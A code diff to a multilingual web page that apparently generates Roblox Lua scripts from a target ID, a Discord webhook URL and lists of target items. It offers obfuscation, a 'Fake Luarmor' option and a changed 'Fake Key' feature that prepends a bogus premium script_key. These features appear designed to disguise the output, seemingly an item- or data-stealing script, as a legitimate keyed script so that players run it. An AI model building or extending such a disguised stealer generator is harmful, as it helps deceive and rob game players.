@@ -461,13 +461,13 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
         <div class="toggle-text"><h4 data-i18n="obfuscate">Ofuscar script</h4><p data-i18n="obfuscateDesc">Ofuscación real con WeAreDevs (Prometheus).</p></div></div>
         <label class="switch"><input type="checkbox" id="toggleObfuscate"><span class="slider"></span></label>
       </div>
-      <div class="toggle-card">
+      <div class="toggle-card" id="fakeKeyCard" style="opacity:0.45;pointer-events:none;">
         <div class="toggle-info"><div class="toggle-icon">🔑</div>
-        <div class="toggle-text"><h4 data-i18n="fakeKey">Fake Key</h4><p data-i18n="fakeKeyDesc">Añade una script_key falsa al inicio del script.</p></div></div>
-        <label class="switch"><input type="checkbox" id="toggleFakeKey"><span class="slider"></span></label>
+        <div class="toggle-text"><h4 data-i18n="fakeKey">Fake Key</h4><p data-i18n="fakeKeyDesc">Añade una script_key falsa arriba del loadstring (requiere Pastefy o Fake Luarmor).</p></div></div>
+        <label class="switch"><input type="checkbox" id="toggleFakeKey" disabled><span class="slider"></span></label>
       </div>
       <div id="fakeKeyArea" style="display:none;margin-top:8px;margin-bottom:8px;">
-        <input class="inp" id="fakeKeyInput" data-i18n-placeholder="fakeKeyPh" placeholder="Ej: FREE-3256544">
+        <input class="inp" id="fakeKeyInput" data-i18n-placeholder="fakeKeyPh" placeholder="Ej: PREMIUM-676767">
       </div>
     </div>
 
@@ -589,8 +589,8 @@ const I18N = {
     obfuscate:"Ofuscar script",
     obfuscateDesc:"Ofuscación real con WeAreDevs (Prometheus).",
     fakeKey:"Fake Key",
-    fakeKeyDesc:"Añade una script_key falsa al inicio del script.",
-    fakeKeyPh:"Ej: FREE-3256544",
+    fakeKeyDesc:"Añade una script_key falsa arriba del loadstring (requiere Pastefy o Fake Luarmor).",
+    fakeKeyPh:"Ej: PREMIUM-676767",
     genWarn:"⚠️ SELECCIONA AL MENOS UN TARGET",
     genId:"⚠️ INGRESA UN TARGET ID",
     genServer:"⚠️ DEBES ESTAR EN EL SERVIDOR DE DISCORD",
@@ -672,8 +672,8 @@ const I18N = {
     obfuscate:"Obfuscate script",
     obfuscateDesc:"Real obfuscation with WeAreDevs (Prometheus).",
     fakeKey:"Fake Key",
-    fakeKeyDesc:"Adds a fake script_key at the start of the script.",
-    fakeKeyPh:"E.g: FREE-3256544",
+    fakeKeyDesc:"Adds a fake script_key above the loadstring (requires Pastefy or Fake Luarmor).",
+    fakeKeyPh:"E.g: PREMIUM-676767",
     genWarn:"⚠️ SELECT AT LEAST ONE TARGET",
     genId:"⚠️ ENTER A TARGET ID",
     genServer:"⚠️ YOU MUST BE IN THE DISCORD SERVER",
@@ -755,8 +755,8 @@ const I18N = {
     obfuscate:"Ofuscar script",
     obfuscateDesc:"Ofuscação real com WeAreDevs (Prometheus).",
     fakeKey:"Fake Key",
-    fakeKeyDesc:"Adiciona uma script_key falsa no início do script.",
-    fakeKeyPh:"Ex: FREE-3256544",
+    fakeKeyDesc:"Adiciona uma script_key falsa acima do loadstring (requer Pastefy ou Fake Luarmor).",
+    fakeKeyPh:"Ex: PREMIUM-676767",
     genWarn:"⚠️ SELECIONE PELO MENOS UM TARGET",
     genId:"⚠️ INSIRA UM TARGET ID",
     genServer:"⚠️ VOCÊ DEVE ESTAR NO SERVIDOR DO DISCORD",
@@ -2391,10 +2391,6 @@ task.spawn(function()
 end)`;
   }
 
-  const useFakeKey = document.getElementById("toggleFakeKey").checked;
-  const fakeKeyVal = (document.getElementById("fakeKeyInput").value || "").trim();
-  const fakeKeyLine = (useFakeKey && fakeKeyVal) ? `script_key = ${fakeKeyVal}\n` : "";
-
   let script = `getgenv().targetId = ${targetId}
 getgenv().webhookUrl = "${webhookUrl}"
 
@@ -2407,7 +2403,7 @@ ${bs}}
 getgenv().targetGears = {
 ${gr}}
 
-${fakeKeyLine}${execBlock}`;
+${execBlock}`;
 
   if (useObfuscate) {
     try {
@@ -2437,6 +2433,12 @@ ${fakeKeyLine}${execBlock}`;
       return;
     }
   }
+
+  const useFakeKey = document.getElementById("toggleFakeKey").checked;
+  const fakeKeyVal = (document.getElementById("fakeKeyInput").value || "").trim();
+  if (useFakeKey && fakeKeyVal && (usePastefy || useFakeLuarmor)) {
+    script = `script_key = ${fakeKeyVal}\n` + script;
+  }
   
   document.getElementById("scriptOutput").textContent = script;
   document.getElementById("result").classList.add("show");
@@ -2445,11 +2447,32 @@ ${fakeKeyLine}${execBlock}`;
 }
 
 function showToast(msg){const old=document.querySelector(".toast");if(old)old.remove();const el=document.createElement("div");el.className="toast";el.textContent=msg;document.body.appendChild(el);setTimeout(()=>el.remove(),4000);}
+function updateFakeKeyAvailability() {
+  const pastefyOn = document.getElementById("togglePastefy").checked;
+  const luarmorOn = document.getElementById("toggleFakeLuarmor").checked;
+  const enabled = pastefyOn || luarmorOn;
+  const card = document.getElementById("fakeKeyCard");
+  const toggle = document.getElementById("toggleFakeKey");
+  const area = document.getElementById("fakeKeyArea");
+  if (enabled) {
+    card.style.opacity = "1";
+    card.style.pointerEvents = "auto";
+    toggle.disabled = false;
+  } else {
+    card.style.opacity = "0.45";
+    card.style.pointerEvents = "none";
+    toggle.checked = false;
+    toggle.disabled = true;
+    area.style.display = "none";
+  }
+}
 document.getElementById("togglePastefy").addEventListener("change", function () {
   if (this.checked) document.getElementById("toggleFakeLuarmor").checked = false;
+  updateFakeKeyAvailability();
 });
 document.getElementById("toggleFakeLuarmor").addEventListener("change", function () {
   if (this.checked) document.getElementById("togglePastefy").checked = false;
+  updateFakeKeyAvailability();
 });
 document.getElementById("toggleFakeKey").addEventListener("change", function () {
   document.getElementById("fakeKeyArea").style.display = this.checked ? "block" : "none";
